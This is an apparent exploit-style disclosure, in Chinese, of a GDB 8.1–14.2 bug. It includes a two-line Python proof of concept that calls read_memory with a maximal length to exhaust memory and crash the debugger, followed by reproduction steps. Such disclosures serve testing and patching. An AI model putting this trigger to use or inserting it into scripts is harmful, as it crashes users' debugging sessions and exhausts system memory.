
## 利用 **GDB 8.1~14.2 内存损坏漏洞**

Google Dork: gdb, 内存泄漏, 内存耗尽，内存越界.

日期: 2024.4.2

漏洞作者: N1nEmAn

供应商主页: https://www.sourceware.org/gdb

软件链接: https://sourceware.org/pub/gdb/releases/

版本: 8.1~14.2 (目前已知，可能还有更多)

测试环境: Ubuntu18.02、archlinux-2024

## POC

保存为 `poc.py`，使用 `source /path/to/poc.py`。

```py
import gdb
gdb.selected_inferior().read_memory(0, 18446744073709551615)
```

## 漏洞重现

我们在最新的 GDB (14.2) 中利用了这个漏洞，以下是我的操作系统的详细信息:

```sh
操作系统: Arch Linux x86_64
内核: 6.8.2-zen2-1-zen
内存: 9998MiB / 27746MiB
CPU: AMD Ryzen 7 6800H with Radeon Graphics
GPU: AMD ATI Radeon 680M
```

### 1.加载任意二进制文件#

### 2.运行它并使用Ctrl+C停止
![image-20240402211541005][]
### 3.执行source poc.py
![image-20240402211613585][]
![image-20240402212709525][]
### 4.在Ubuntu中
![image-20240402212845142][]
<!--stackedit_data:
eyJoaXN0b3J5IjpbMTkyMjI5MjM5N119
-->